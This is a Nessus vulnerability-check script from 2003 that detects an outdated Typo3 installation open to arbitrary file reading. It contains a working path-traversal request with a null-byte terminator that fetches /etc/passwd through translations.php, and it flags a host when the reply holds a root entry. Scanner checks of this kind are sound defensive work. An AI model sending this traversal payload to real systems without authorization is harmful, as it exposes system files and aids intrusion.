#
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# From: Martin Eiszner <martin@websec.org>
# To: bugtraq@securityfocus.com
# Subject: typo3 issues
# Message-Id: <20030228103704.1b657228.martin@websec.org>


if(description)
{
 script_id(11284);
 script_bugtraq_id(6982, 6983, 6984, 6985, 6986, 6988, 6993);
 script_version ("$Revision: 1.9 $");
 
 
 name["english"] = "typo3 arbitrary file reading";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running an old version of typo3.

An attacker may use it to read arbitrary files and 
execute arbitrary commands on this host.

Solution : Upgrade to Typo3 3.5.0
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Reads /etc/passwd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");


function check(port, dir)
{
 req = http_get(item:string(dir, "/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00"),
	       port:port);
	       
 resp = http_keepalive_send_recv(port:port, data:req);
 if(resp == NULL)exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:resp))
 	{
	security_hole(port);
	exit(0);
	}		       
}


port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs(),  "/typo3", "/testsite/typo3");

foreach dir (dirs)
{
check(port:port, dir:dir);
}
